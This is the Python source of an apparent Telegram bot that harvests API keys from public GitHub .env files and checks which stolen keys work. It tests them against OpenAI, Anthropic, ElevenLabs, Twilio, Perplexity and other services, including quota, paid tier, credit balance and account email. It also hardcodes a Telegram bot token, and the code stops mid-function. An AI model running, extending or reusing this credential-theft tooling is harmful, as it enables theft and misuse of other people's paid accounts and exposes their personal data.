import os
import sys
import logging
import time
import re
import requests
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
from datetime import datetime
import io
from contextlib import redirect_stdout
import openai
from openai import OpenAI
from openai._exceptions import OpenAIError
from github import Github
from github.GithubException import RateLimitExceededException, UnknownObjectException
from twilio.rest import Client
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Get GitHub token from environment variables
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")

# Hardcoded Telegram token
TELEGRAM_TOKEN = "7860441992:AAFBdOE7K1QdgS_gRHHK40iPp3NqhRk3t6U"

# Adding constants that were previously imported
RESULTS_FOLDER = "SCRAPED_RESULT"

# Check if Twilio is available
try:
    from twilio.rest import Client
    TWILIO_AVAILABLE = True
except ImportError:
    TWILIO_AVAILABLE = False

# Try to import RunwayML for validation
try:
    from runwayml import RunwayML
    RUNWAYML_AVAILABLE = True
except ImportError:
    RUNWAYML_AVAILABLE = False

# Adding GitHubAPIScraper class from github_api_scraper_gui.py
class GitHubAPIScraper:
    def __init__(self, github_token):
        self.github_token = github_token
        self.g = Github(github_token)
            
        # Common placeholder patterns to filter out
        self.placeholder_patterns = [
            r'your.*key',
            r'api.*key.*here',
            r'your.*api',
            r'place.*holder',
            r'dummy',
            r'example',
            r'xxx+',
            r'test.*key',
            r'sample',
            r'demo',
            r'replace',
            r'change',
            r'\.\.\.',
            r'key.*goes.*here',
            r'<.*>',
            r'insert',
        ]
        
    def is_valid_api_key(self, api_name, api_key):
        """Check if the API key is valid and not a placeholder"""
        # Convert to lowercase for case-insensitive matching
        key_lower = api_key.lower()
        
        # Filter out very short keys (likely placeholders or dummy values)
        if len(api_key) < 8:
            return False
            
        # Filter out keys that are just the variable name repeated
        if api_name.lower() in key_lower:
            return False
            
        # Check if key matches any placeholder patterns
        for pattern in self.placeholder_patterns:
            if re.search(pattern, key_lower, re.IGNORECASE):
                return False
                
        # Specific validation for OpenAI API keys
        if api_name.lower() == "openai_api_key":
            # OpenAI keys typically start with "sk-" and are 51 characters long
            if not api_key.startswith("sk-") or len(api_key) < 20:
                return False
                
        # Add more specific validations for other API types as needed
        # Example: GitHub tokens, AWS keys, etc.
        
        return True
        
    def search_api_keys(self, api_key_name, update_callback=None, complete_callback=None):
        """Search for API keys in .env files on GitHub with callback for GUI updates"""
        # Check if this is a multi-key search (comma-separated)
        if ',' in api_key_name:
            self.search_multiple_api_keys(api_key_name, update_callback, complete_callback)
            return
            
        # Create a file name based on the API key name in the SCRAPED_RESULT folder
        results_file = os.path.join(RESULTS_FOLDER, f"{api_key_name.upper()}.txt")
        
        query = f'"{api_key_name}" filename:.env'
        
        try:
            # Get all repositories matching the search query
            repos = self.g.search_code(query=query)
            total_count = repos.totalCount
            
            if update_callback:
                update_callback(f"Found {total_count} potential matches. Starting to scrape...")
            
            valid_keys_found = 0
            found_keys = set()  # Use a set to avoid duplicates
            
            # Create/clear the output file
            try:
                os.makedirs(os.path.dirname(results_file), exist_ok=True)
                with open(results_file, 'w', encoding='utf-8') as f:
                    pass  # Just create an empty file
            except Exception as e:
                if update_callback:
                    update_callback(f"Error creating results file: {str(e)}")
                return
            
            for i, repo in enumerate(repos):
                try:
                    # Get the raw content of the file
                    content = repo.decoded_content.decode('utf-8')
                    
                    # Search for the API key pattern
                    pattern = f"{api_key_name}=['\"]?([^'\"\n]+)['\"]?"
                    matches = re.findall(pattern, content)
                    
                    for match in matches:
                        if self.is_valid_api_key(api_key_name, match) and match not in found_keys:
                            # Add to tracking set
                            found_keys.add(match)
                            valid_keys_found += 1
                            
                            # Write to file in real-time
                            try:
                                with open(results_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{match}\n")
                            except Exception as e:
                                if update_callback:
                                    update_callback(f"Error writing to results file: {str(e)}")
                            
                            if update_callback:
                                update_callback(f"Found valid key: {match[:10]}... ({valid_keys_found} total)")
                        
                except Exception as e:
                    if update_callback:
                        update_callback(f"Error processing repo {repo.repository.full_name}: {str(e)}")
                    continue
                
                # Update progress
                if update_callback:
                    progress = (i + 1) / total_count
                    update_callback(f"Processing: {i+1}/{total_count} repositories", progress)
                    
                # Sleep to avoid hitting rate limits
                time.sleep(0.5)
            
            summary = f"Completed! Found {valid_keys_found} valid API keys out of {total_count} potential matches.\n"
            summary += f"Saved {len(found_keys)} unique API keys to {results_file}"
            
            if update_callback:
                update_callback(summary)
                
            if complete_callback:
                complete_callback(results_file, len(found_keys))
                    
        except RateLimitExceededException:
            error_msg = "GitHub API rate limit exceeded. Please wait or use a GitHub token with higher limits."
            if update_callback:
                update_callback(error_msg)
            return
        except UnknownObjectException:
            error_msg = "Error: Unable to access the repository. It may be private or have been deleted."
            if update_callback:
                update_callback(error_msg)
            return
        except Exception as e:
            error_msg = f"An error occurred: {str(e)}"
            if update_callback:
                update_callback(error_msg)
            return
            
    def search_multiple_api_keys(self, api_key_names, update_callback=None, complete_callback=None):
        """Search for multiple API keys in the same repository"""
        # Split the comma-separated key names
        key_names = [name.strip() for name in api_key_names.split(',')]
        
        # Create a descriptive file name for the combined search
        combined_name = "_AND_".join([name.upper() for name in key_names])
        results_file = os.path.join(RESULTS_FOLDER, f"{combined_name}.txt")
        
        # Build a query to find repositories that might contain all keys
        # We'll use the first key to search, then filter for the rest
        primary_key = key_names[0]
        query = f'"{primary_key}" filename:.env'
        
        try:
            # Get all repositories matching the search query for the primary key
            repos = self.g.search_code(query=query)
            total_count = repos.totalCount
            
            if update_callback:
                update_callback(f"Found {total_count} potential matches for {primary_key}. Checking for all required keys...")
            
            valid_sets_found = 0
            found_sets = set()  # Use a set to avoid duplicates
            
            # Create/clear the output file
            try:
                os.makedirs(os.path.dirname(results_file), exist_ok=True)
                with open(results_file, 'w', encoding='utf-8') as f:
                    pass  # Just create an empty file
            except Exception as e:
                if update_callback:
                    update_callback(f"Error creating results file: {str(e)}")
                return
            
            for i, repo in enumerate(repos):
                try:
                    # Get the raw content of the file
                    content = repo.decoded_content.decode('utf-8')
                    
                    # Check if all keys are present in this file
                    all_keys_found = True
                    key_values = {}
                    
                    for key_name in key_names:
                        pattern = f"{key_name}=['\"]?([^'\"\n]+)['\"]?"
                        matches = re.findall(pattern, content)
                        
                        if not matches:
                            all_keys_found = False
                            break
                            
                        # Use the first match for this key (most common in .env files)
                        match = matches[0]
                        if not self.is_valid_api_key(key_name, match):
                            all_keys_found = False
                            break
                            
                        key_values[key_name] = match
                    
                    # If all keys were found and valid, save them
                    if all_keys_found:
                        # Create the combo format string (KEY1:KEY2:KEY3)
                        combo_values = ":".join([key_values[key_name] for key_name in key_names])
                        
                        # Only add if this exact combo hasn't been seen before
                        if combo_values not in found_sets:
                            found_sets.add(combo_values)
                            valid_sets_found += 1
                            
                            # Write to file in real-time - just the combo format
                            try:
                                with open(results_file, 'a', encoding='utf-8') as f:
                                    f.write(f"{combo_values}\n")
                            except Exception as e:
                                if update_callback:
                                    update_callback(f"Error writing to results file: {str(e)}")
                            
                            if update_callback:
                                update_callback(f"Found complete set of keys ({valid_sets_found} total)")
                    
                except Exception as e:
                    if update_callback:
                        update_callback(f"Error processing repo {repo.repository.full_name}: {str(e)}")
                    continue
                
                # Update progress
                if update_callback:
                    progress = (i + 1) / total_count
                    update_callback(f"Processing: {i+1}/{total_count} repositories", progress)
                    
                # Sleep to avoid hitting rate limits
                time.sleep(0.5)
            
            summary = f"Completed! Found {valid_sets_found} unique credential sets.\n"
            summary += f"Saved results to {results_file} in format: {':'.join(key_names)}"
            
            if update_callback:
                update_callback(summary)
                
            if complete_callback:
                complete_callback(results_file, valid_sets_found)
                    
        except RateLimitExceededException:
            error_msg = "GitHub API rate limit exceeded. Please wait or use a GitHub token with higher limits."
            if update_callback:
                update_callback(error_msg)
            return
        except UnknownObjectException:
            error_msg = "Error: Unable to access the repository. It may be private or have been deleted."
            if update_callback:
                update_callback(error_msg)
            return
        except Exception as e:
            error_msg = f"An error occurred: {str(e)}"
            if update_callback:
                update_callback(error_msg)
            return

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Create results folder if it doesn't exist
if not os.path.exists(RESULTS_FOLDER):
    os.makedirs(RESULTS_FOLDER, exist_ok=True)

# Create a folder for batch validation results
BATCH_RESULTS_FOLDER = "BATCH_RESULTS"
if not os.path.exists(BATCH_RESULTS_FOLDER):
    os.makedirs(BATCH_RESULTS_FOLDER, exist_ok=True)

# Dictionary to track active searches per user
active_searches = {}

# Global application reference
app = None

# Store file IDs temporarily (to avoid long callback data)
file_cache = {}

# Telegram bot token
TELEGRAM_TOKEN = "7860441992:AAFBdOE7K1QdgS_gRHHK40iPp3NqhRk3t6U"

# Direct Telegram API functions
def telegram_edit_message(chat_id, message_id, text):
    """Use direct Telegram API to edit a message"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/editMessageText"
    payload = {
        'chat_id': chat_id,
        'message_id': message_id,
        'text': text,
        'parse_mode': 'HTML'
    }
    
    try:
        response = requests.post(url, json=payload)
        print(f"API Response: {response.status_code} - {response.text[:100]}...")
        return response.json()
    except Exception as e:
        print(f"Error calling Telegram API: {e}")
        return None

def telegram_send_document(chat_id, file_path, caption):
    """Use direct Telegram API to send a document"""
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument"
    
    try:
        with open(file_path, 'rb') as file:
            files = {'document': file}
            data = {
                'chat_id': chat_id,
                'caption': caption
            }
            response = requests.post(url, data=data, files=files)
            print(f"Send document response: {response.status_code}")
            return response.json()
    except Exception as e:
        print(f"Error sending document via API: {e}")
        return None

# API Validation functions
def validate_api_key(api_key: str) -> bool:
    """
    Validate an OpenAI API key by making a test request.
    Returns True if the key is valid, False otherwise.
    """
    try:
        # Configure the client with the API key
        client = openai.OpenAI(api_key=api_key)
        
        # Make a minimal test request
        response = client.models.list()
        
        # If we get here, the key is valid
        print("✅ API key is valid!")
        print("Available models:", ", ".join([model.id for model in response.data[:3]]))
        return True
        
    except openai.AuthenticationError:
        print("❌ Invalid API key: Authentication failed")
        return False
    except openai.APIError as e:
        print(f"❌ API error occurred: {str(e)}")
        return False
    except Exception as e:
        print(f"❌ An error occurred: {str(e)}")
        return False

def check_eleven_premium(api_key: str) -> tuple:
    """
    Check if Eleven Labs API key is premium (character limit > 10,000)
    Returns a tuple of (is_premium, character_limit, error_message, usage_details)
    where usage_details is a dict containing additional information
    """
    try:
        headers = {
            "xi-api-key": api_key,
            "accept": "application/json"
        }
        
        # Get subscription info
        response = requests.get(
            "https://api.elevenlabs.io/v1/user/subscription",
            headers=headers,
            timeout=10
        )
        
        if response.status_code == 200:
            data = response.json()
            
            # Extract usage information
            character_count = data.get('character_count', 0)
            character_limit = data.get('character_limit', 0)
            chars_remaining = character_limit - character_count
            
            # Get quota reset date if available
            next_reset = data.get('next_character_count_reset_unix')
            reset_date = datetime.fromtimestamp(next_reset).strftime('%Y-%m-%d %H:%M:%S') if next_reset else "N/A"
            
            # Calculate usage percentage
            usage_percent = (character_count / character_limit) * 100 if character_limit > 0 else 0
            
            # Create usage details dictionary
            usage_details = {
                "character_count": character_count,
                "character_limit": character_limit,
                "chars_remaining": chars_remaining,
                "reset_date": reset_date,
                "usage_percent": usage_percent
            }
            
            # Check if premium (character limit > 10,000)
            is_premium = character_limit > 10000
            
            return (is_premium, character_limit, None, usage_details)
        else:
            return (False, 0, f"API error: Status code {response.status_code}", {})
            
    except Exception as e:
        return (False, 0, str(e), {})

def check_usage(api_key: str) -> str:
    """
    Check the usage statistics for Eleven Labs API
    Returns a formatted string with the results
    """
    output = io.StringIO()
    with redirect_stdout(output):
        try:
            headers = {
                "xi-api-key": api_key,
                "accept": "application/json"
            }
            
            # Get subscription info
            response = requests.get(
                "https://api.elevenlabs.io/v1/user/subscription",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                
                # Display API key validity
                print("✅ API Key is valid!")
                
                # Extract useful information
                character_count = data.get('character_count', 0)
                character_limit = data.get('character_limit', 0)
                chars_remaining = character_limit - character_count
                
                # Get quota reset date if available
                next_reset = data.get('next_character_count_reset_unix')
                reset_date = datetime.fromtimestamp(next_reset).strftime('%Y-%m-%d %H:%M:%S') if next_reset else "N/A"
                
                # Print usage information
                print("\n📊 Eleven Labs API Usage Summary:")
                print("=" * 40)
                print(f"🔤 Characters Used: {character_count:,}")
                print(f"📈 Character Limit: {character_limit:,}")
                print(f"✨ Characters Remaining: {chars_remaining:,}")
                print(f"🔄 Next Reset Date: {reset_date}")
                
                # Calculate usage percentage
                if character_limit > 0:
                    usage_percent = (character_count / character_limit) * 100
                    print(f"📉 Usage Percentage: {usage_percent:.1f}%")
                    
                # Determine if premium account
                is_premium = character_limit > 10000
                tier = "Premium" if is_premium else "Free"
                print(f"👤 Account Type: {tier}")
                
                # Display extra information for premium accounts
                if is_premium:
                    print("\n🌟 Premium Features:")
                    print("=" * 40)
                    print("• Higher character limit")
                    print("• Priority queue processing")
                    print("• Access to professional voices")
                else:
                    print("\n💡 Upgrade Recommendation:")
                    print("=" * 40)
                    print("• Consider upgrading to a premium account for:")
                    print("  - Higher character limits")
                    print("  - More voice options")
                    print("  - Priority processing")
                
            elif response.status_code == 401:
                print("❌ Invalid API key: Authentication failed")
            else:
                print(f"❌ API error occurred: Status code {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"❌ Request error occurred: {str(e)}")
        except Exception as e:
            print(f"❌ An error occurred: {str(e)}")
    
    return output.getvalue()

def check_openai_valid(api_key: str) -> tuple:
    """
    Check if OpenAI API key is valid
    Returns a tuple of (is_valid, error_message, model_details)
    where model_details is a dict containing available models
    """
    # First check with a chat completion request - this gives the most accurate quota status
    try:
        # Use a minimal API call to check if the key works and has quota
        endpoint = "https://api.openai.com/v1/chat/completions"
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        data = {
            "model": "gpt-3.5-turbo",
            "messages": [{"role": "user", "content": "Hi"}],
            "max_tokens": 1
        }
        
        response = requests.post(
            endpoint,
            headers=headers,
            json=data,
            timeout=10
        )
        
        # If we can make a completion request, the key is definitely valid and has quota
        if response.status_code == 200:
            # Now fetch models to get more details about the account
            try:
                models_response = requests.get(
                    "https://api.openai.com/v1/models",
                    headers=headers,
                    timeout=10
                )
                
                if models_response.status_code == 200:
                    data = models_response.json()
                    models = data.get('data', [])
                    model_names = [m.get('id', '') for m in models]
                    has_gpt4 = any('gpt-4' in model.lower() for model in model_names)
                    
                    model_details = {
                        "models": model_names[:5],
                        "total_models": len(model_names),
                        "has_gpt4": has_gpt4,
                        "status": "active"
                    }
                else:
                    # Fallback if models endpoint doesn't work but completions did
                    model_details = {
                        "models": ["gpt-3.5-turbo"],
                        "total_models": 1,
                        "has_gpt4": False,
                        "status": "active"
                    }
                
                return (True, None, model_details)
            except Exception as e:
                # If models fetch fails but completion worked, still mark as active
                model_details = {
                    "models": ["gpt-3.5-turbo"],
                    "total_models": 1,
                    "has_gpt4": False,
                    "status": "active"
                }
                return (True, None, model_details)
        
        # Check for quota exceeded error in the completion request
        elif response.status_code == 429:
            error_data = response.json().get('error', {})
            if error_data.get('code') == 'insufficient_quota' or 'quota' in error_data.get('message', '').lower():
                model_details = {
                    "models": [],
                    "total_models": 0,
                    "has_gpt4": False,
                    "status": "quota_exceeded"
                }
                return (True, "Valid key but quota exceeded", model_details)
            else:
                return (False, f"Rate limit error: {response.text}", {})
        
        # Authentication error - invalid key
        elif response.status_code == 401:
            return (False, "Invalid API key", {})
        
        # Other errors
        else:
            return (False, f"API error: Status code {response.status_code}", {})
    
    except Exception as e:
        # If the primary method fails, try the models endpoint as fallback
        try:
            headers = {
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            }
            
            # Check models endpoint
            response = requests.get(
                "https://api.openai.com/v1/models",
                headers=headers,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                models = data.get('data', [])
                model_names = [m.get('id', '') for m in models]
                has_gpt4 = any('gpt-4' in model.lower() for model in model_names)
                
                model_details = {
                    "models": model_names[:5],
                    "total_models": len(model_names),
                    "has_gpt4": has_gpt4,
                    "status": "active"
                }
                
                return (True, None, model_details)
            # Check for quota exceeded (a valid key but with quota issues)
            elif response.status_code == 429:
                error_data = response.json().get('error', {})
                if error_data.get('code') == 'insufficient_quota' or 'quota' in error_data.get('message', '').lower():
                    model_details = {
                        "models": [],
                        "total_models": 0,
                        "has_gpt4": False,
                        "status": "quota_exceeded"
                    }
                    return (True, "Valid key but quota exceeded", model_details)
                else:
                    return (False, f"Rate limit error: {response.text}", {})
            else:
                return (False, f"API error: Status code {response.status_code}", {})
        except Exception as e2:
            return (False, f"Error checking API key: {str(e)} and {str(e2)}", {})

def validate_openai_key(api_key: str) -> str:
    """
    Validate an OpenAI API key and return the validation results as a string
    """
    output = io.StringIO()
    with redirect_stdout(output):
        try:
            is_valid, error, model_details = check_openai_valid(api_key)
            
            key_status = model_details.get('status', '')
            
            if is_valid:
                if key_status == "quota_exceeded":
                    print("⚠️ API Key is valid but quota is exceeded")
                    print("This key appears to be valid but has insufficient quota")
                else:
                    print("✅ API Key is valid!")
                
                has_gpt4 = model_details.get('has_gpt4', False)
                
                # Determine account tier
                if key_status == "quota_exceeded":
                    tier = "Unknown (Quota Exceeded)"
                else:
                    tier = "Paid" if has_gpt4 else "Free"
                
                print(f"\n👤 Account Information:")
                print("=" * 40)
                print(f"• Account Type: {tier}")
                
                if key_status == "quota_exceeded":
                    print("• Status: Quota exceeded/insufficient")
                    print("• Recommendation: Check billing details or add funds")
                elif has_gpt4:
                    print("• Features: Access to GPT-4 and other advanced models")
                    print("• Access Level: Paid tier with advanced capabilities")
                else:
                    print("• Features: Basic API access")
                    print("• Access Level: Free tier")
                
                # Display available models if any
                models = model_details.get('models', [])
                if models and key_status != "quota_exceeded":
                    print("\n📚 Available Models:")
                    print("=" * 40)
                    for model in models[:5]:
                        print(f"• {model}")
            else:
                print("❌ Invalid API key")
                if error:
                    print(f"Error: {error}")
        
        except Exception as e:
            print(f"❌ Error occurred: {str(e)}")
    
    return output.getvalue()

def check_runwayml_valid(api_key: str) -> tuple:
    """
    Check if RunwayML API key is valid
    Returns a tuple of (is_valid, error_message, api_details)
    where api_details is a dict containing additional information
    """
    if not RUNWAYML_AVAILABLE:
        return (False, "RunwayML package not installed. Run 'pip install runwayml' to install it.", {})
    
    try:
        # Initialize the RunwayML client with the API key
        client = RunwayML(api_key=api_key)
        
        # Check organization details instead of creating a task
        details = client.organization.retrieve()
        
        # If we get here, the key is valid
        # Check credit balance to determine if it's a premium account
        credit_balance = details.creditBalance if hasattr(details, 'creditBalance') else 0
        
        # Create details dictionary
        api_details = {
            "credit_balance": credit_balance,
            "org_name": details.name if hasattr(details, 'name') else "Unknown",
            "status": "active"
        }
        
        # Consider premium if they have credits
        is_premium = credit_balance > 0
        
        return (True, None, api_details)
        
    except Exception as e:
        error_msg = str(e).lower()
        if "auth" in error_msg or "unauthor" in error_msg or "invalid" in error_msg:
            return (False, "Invalid API key: Authentication failed", {})
        elif "billing" in error_msg or "payment" in error_msg:
            return (True, "Valid API key but billing is not set up", {"status": "no_billing"})
        else:
            return (False, f"API error occurred: {str(e)}", {})

def check_minimax_valid(api_key: str) -> tuple:
    """
    Check if MiniMax API key is valid
    Returns a tuple of (is_valid, error_message, api_details)
    where api_details is a dict containing additional information
    """
    try:
        url = "https://api.minimaxi.chat/v1/text/chatcompletion_v2"
        headers = {
            "Authorization": f"Bearer {api_key}",
            "Content-Type": "application/json"
        }
        payload = {
            "model": "MiniMax-Text-01",
            "messages": [
                {
                    "content": "MM Intelligent Assistant is a large language model that is self-developed by MiniMax and does not call the interface of other products.",
                    "role": "system",
                    "name": "MM Intelligent Assistant"
                },
                {
                    "role": "user",
                    "content": "Hello"
                }
            ]
        }

        response = requests.post(url, headers=headers, json=payload, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            if "choices" in data and len(data["choices"]) > 0:
                # Try to extract account details from the JWT token
                try:
                    import jwt
                    token_parts = api_key.split('.')
                    if len(token_parts) == 3:
                        decoded = jwt.decode(api_key, options={"verify_signature": False})
                        api_details = {
                            "user_name": decoded.get("UserName", "Unknown"),
                            "email": decoded.get("Mail", "Unknown"),
                            "group_name": decoded.get("GroupName", "Unknown"),
                            "status": "active"
                        }
                    else:
                        api_details = {"status": "active"}
                except:
                    api_details = {"status": "active"}
                
                return (True, None, api_details)
            else:
                return (False, "Invalid response format", {})
        else:
            return (False, f"API error: Status code {response.status_code}", {})
            
    except Exception as e:
        return (False, f"Error checking API key: {str(e)}", {})

def check_perplexity_valid(api_key: str) -> tuple:
    """
    Check if Perplexity API key is valid
    Returns a tuple of (is_valid, error_message, api_details)
    where api_details is a dict containing additional information
    """
    try:
        response = requests.post(
            "https://api.perplexity.ai/chat/completions",
            headers={
                "Authorization": f"Bearer {api_key}",
                "Content-Type": "application/json"
            },
            json={
                "model": "sonar",
                "messages": [{"role": "user", "content": "Hello"}]
            },
            timeout=10
        )
        
        if response.status_code == 200:
            # Try to get available models to determine account type
            try:
                models_response = requests.get(
                    "https://api.perplexity.ai/models",
                    headers={
                        "Authorization": f"Bearer {api_key}",
                        "Content-Type": "application/json"
                    },
                    timeout=10
                )
                
                models_data = models_response.json() if models_response.status_code == 200 else {}
                models = models_data.get('data', [])
                model_names = [m.get('id', '') for m in models] if isinstance(models, list) else []
                
                # Check for pro models
                has_pro_models = any('large' in model.lower() for model in model_names)
                
                api_details = {
                    "models": model_names[:5] if model_names else ["sonar"],
                    "total_models": len(model_names) if model_names else 1,
                    "has_pro": has_pro_models,
                    "status": "active"
                }
            except:
                # If models endpoint fails but completion worked, still mark as active
                api_details = {
                    "models": ["sonar"],
                    "total_models": 1,
                    "has_pro": False,
                    "status": "active"
                }
            
            return (True, None, api_details)
        
        elif response.status_code == 401:
            return (False, "Invalid API key: Authentication failed", {})
        
        elif response.status_code == 429:
            # Rate limit or quota exceeded
            return (True, "Valid key but rate limit or quota exceeded", {"status": "rate_limited"})
        
        else:
            return (False, f"API error: Status code {response.status_code}", {})
            
    except Exception as e:
        return (False, f"Error checking API key: {str(e)}", {})

def validate_perplexity_key(api_key: str) -> str:
    """
    Validate a Perplexity API key and return the validation results as a string
    """
    output = io.StringIO()
    with redirect_stdout(output):
        try:
            is_valid, error, api_details = check_perplexity_valid(api_key)
            
            key_status = api_details.get('status', '')
            
            if is_valid:
                if key_status == "rate_limited":
                    print("⚠️ API Key is valid but rate limited or quota exceeded")
                else:
                    print("✅ API Key is valid!")
                
                has_pro = api_details.get('has_pro', False)
                
                # Only print account information for Pro accounts or rate limited accounts
                if key_status == "rate_limited":
                    print("\n👤 Account Information:")
                    print("=" * 40)
                    print("• Status: Rate limited or quota exceeded")
                    print("• Recommendation: Check API usage or wait before trying again")
                elif has_pro:
                    print("\n👤 Account Information:")
                    print("=" * 40)
                    print("• Account Type: Pro")
                    print("• Features: Access to larger models and advanced capabilities")
                    print("• Access Level: Pro tier with advanced capabilities")
                    
                    # Display available models only for Pro accounts and if they're not default
                    models = api_details.get('models', [])
                    if models and models != ["sonar"] and len(models) > 1:
                        print("\n📚 Available Models:")
                        print("=" * 40)
                        for model in models[:5]:
                            print(f"• {model}")
            else:
                print("❌ Invalid API key")
                if error:
                    print(f"Error: {error}")
        
        except Exception as e:
            print(f"❌ Error occurred: {str(e)}")
    
    return output.getvalue()

def check_aiml_valid(api_key: str) -> tuple:
    """
    Check if AIML API key is valid
    Returns a tuple of (is_valid, error_message, api_details)
    where api_details is a dict containing additional information
    """
    try:
        r = requests.post(
            "https://api.aimlapi.com/v2/generate/video/google/generation",
            headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
            data=json.dumps({"model": "veo2", "prompt": "text", "aspect_ratio": "16:9", "duration": 5})
        )
        
        is_valid = r.status_code == 201
        error_message = None if is_valid else f"Invalid ({r.status_code})"
        api_details = {"status": "active"} if is_valid else {}
        
        return (is_valid, error_message, api_details)
            
    except Exception as e:
        return (False, f"Error checking API key: {str(e)}", {})

def validate_aiml_key(api_key: str) -> str:
    """
    Validate an AIML API key and return the validation results as a string
    """
    output = io.StringIO()
    with redirect_stdout(output):
        try:
            r = requests.post(
                "https://api.aimlapi.com/v2/generate/video/google/generation",
                headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
                data=json.dumps({"model": "veo2", "prompt": "text", "aspect_ratio": "16:9", "duration": 5})
            )
            
            print("✅ Valid" if r.status_code == 201 else f"❌ Invalid ({r.status_code})")
        
        except Exception as e:
            print(f"❌ Error occurred: {str(e)}")
    
    return output.getvalue()

def check_anthropic_valid(api_key: str) -> tuple:
    """
    Check if Anthropic API key is valid
    Returns a tuple of (is_valid, error_message, model_details)
    where model_details is a dict containing information about the account
    """
    try:
        # Construct API endpoint URL
        endpoint = "https://api.anthropic.com/v1/messages"
        
        # Set up headers with the API key
        headers = {
            "x-api-key": api_key,
            "anthropic-version": "2023-06-01",
            "content-type": "application/json"
        }
        
        # Create a minimal request to test the API key
        data = {
            "model": "claude-2.1",
            "max_tokens": 1,
            "messages": [
                {"role": "user", "content": "Hello"}
            ]
        }
        
        # Make the request
        response = requests.post(
            endpoint,
            headers=headers,
            json=data,
            timeout=10
        )
        
        # If successful, key is valid with sufficient credits
        if response.status_code == 200:
            # Try to determine if it has access to Claude 3 (premium)
            has_claude3 = False
            
            # Try checking available models if possible
            try:
                models_endpoint = "https://api.anthropic.com/v1/models"
                models_response = requests.get(
                    models_endpoint,
                    headers=headers,
                    timeout=10
                )
                
                if models_response.status_code == 200:
                    models_data = models_response.json()
                    models = models_data.get('data', [])
                    model_names = [m.get('id', '') for m in models]
                    has_claude3 = any('claude-3' in model.lower() for model in model_names)
                    
                    model_details = {
                        "models": model_names,
                        "total_models": len(model_names),
                        "has_claude3": has_claude3,
                        "status": "active"
                    }
                else:
                    # Fallback if models endpoint fails
                    model_details = {
                        "models": ["claude-2.1"],
                        "total_models": 1,
                        "has_claude3": False,
                        "status": "active"
                    }
            except Exception:
                # Fallback if models endpoint fails
                model_details = {
                    "models": ["claude-2.1"],
                    "total_models": 1,
                    "has_claude3": False,
                    "status": "active"
                }
            
            return (True, None, model_details)
        
        # Check for credit balance too low error
        elif response.status_code == 400:
            error_data = response.json().get('error', {})
            error_msg = error_data.get('message', '')
            
            if "credit balance is too low" in error_msg.lower():
                model_details = {
                    "models": [],
                    "total_models": 0,
                    "has_claude3": False,
                    "status": "credit_insufficient"
                }
                return (True, "Valid key but insufficient credit balance", model_details)
            else:
                return (False, f"Bad request error: {error_msg}", {})
        
        # Authentication error - invalid key
        elif response.status_code == 401:
            return (False, "Invalid API key", {})
        
        # Other errors
        else:
            return (False, f"API error: Status code {response.status_code}", {})
    
    except Exception as e:
        return (False, f"Error checking API key: {str(e)}", {})

def check_twilio_valid(credentials: str) -> tuple:
    """
    Check if Twilio credentials are valid
    Returns a tuple of (is_valid, error_message, account_details)
    where account_details is a dict containing account information
    
    Credentials should be in format: ACCOUNT_SID:AUTH_TOKEN
    """
    try:
        # Check if Twilio is available
        if not TWILIO_AVAILABLE:
            return (False, "Twilio package not installed. Run 'pip install twilio' to install it.", {})
        
        # Split credentials
        if ":" not in credentials:
            return (False, "Invalid format. Credentials should be in format: ACCOUNT_SID:AUTH_TOKEN", {})
        
        account_sid, auth_token = credentials.split(":", 1)
        
        # Initialize Twilio client
        client = Client(account_sid, auth_token)
        
        # Fetch account details
        account = client.api.accounts(account_sid).fetch()
        
        # Fetch balance
        balance = client.balance.fetch()
        
        # Get account details
        account_details = {
            "status": account.status,
            "type": account.type,
            "name": account.friendly_name,
            "balance": balance.balance,
            "currency": balance.currency,
            "created_date": account.date_created.strftime("%Y-%m-%d") if account.date_created else "N/A"
        }
        
        return (True, None, account_details)
    
    except ImportError:
        return (False, "Twilio package not installed. Run 'pip install twilio' to install it.", {})
    except Exception as e:
        return (False, str(e), {})

def check_grok_valid(api_key: str) -> tuple:
    """
    Check if Grok API key is valid
    Returns a tuple of (is_valid, error_message, model_details)
    where model_details is a dict containing information about the account
    """
    try:
        # Configure the client with the API key
        client = openai.OpenAI(
            api_key=api_key,
            base_url="https://api.x.ai/v1"
        )
        
        # Try to make a test request
        try:
            completion = client.chat.completions.create(
                model="grok-2-latest",
                messages=[{"role": "user", "content": "Test"}]
            )
            
            # If we get here, the key is valid
            # Try to get models list for more details
            try:
                models = client.models.list()
                model_names = [model.id for model in models.data]
                
                model_details = {
                    "models": model_names,
                    "total_models": len(model_names),
                    "status": "active"
                }
            except:
                # If models list fails but completion worked, still mark as active
                model_details = {
                    "models": ["grok-2-latest"],
                    "total_models": 1,
                    "status": "active"
                }
            
            return (True, None, model_details)
            
        except openai.OpenAIError as e:
            if "insufficient_quota" in str(e).lower() or "exceeded" in str(e).lower():
                model_details = {
                    "models": [],
                    "total_models": 0,
                    "status": "quota_exceeded"
                }
                return (True, "Valid key but quota exceeded", model_details)
            else:
                return (False, str(e), {})
                
    except Exception as e:
        return (False, str(e), {})

def check_gemini_valid(api_key: str) -> tuple:
    """
    Check if Gemini API key is valid and determine if it's a paid tier
    Returns tuple of (is_valid, error_message, api_details)
    where api_details is a dict with API information
    """
    try:
        # API endpoint for lightweight test request
        url = f"https://generativelanguage.googleapis.com/v1/models/gemini-1.5-pro:generateContent?key={api_key}"
        headers = {
            "Content-Type": "application/json"
        }
        data = {
            "contents": [
                {
                    "parts": [{"text": "Hello"}]
                }
            ]
        }
        
        # Make the request
        response = requests.post(url, headers=headers, json=data, timeout=10)
        
